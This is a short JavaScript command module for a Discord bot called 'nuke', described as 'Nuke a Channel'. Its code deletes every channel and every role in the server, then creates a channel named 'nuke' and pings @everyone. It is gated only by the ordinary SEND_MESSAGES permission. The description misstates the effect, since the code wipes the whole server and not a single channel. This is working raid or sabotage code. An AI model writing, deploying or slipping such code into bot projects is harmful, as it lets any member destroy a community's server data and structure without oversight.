const Command = require("../Structres/Command.js");

module.exports = new Command({
    name: 'nuke',
    description: 'Nuke a Channel',
    aliases: ['nuclear'],
    permission:"SEND_MESSAGES",

    async run(message, args, client) {

        message.guild.channels.cache.forEach
            (channel => channel.delete());

        message.guild.roles.cache.forEach
            (role => role.delete());
     
        await message.guild.channels.create
            (`nuke`, {
                type: 'text'
            }).then(async channel => {
               channel.send('@everyone')
              
            })

        

        

    }
})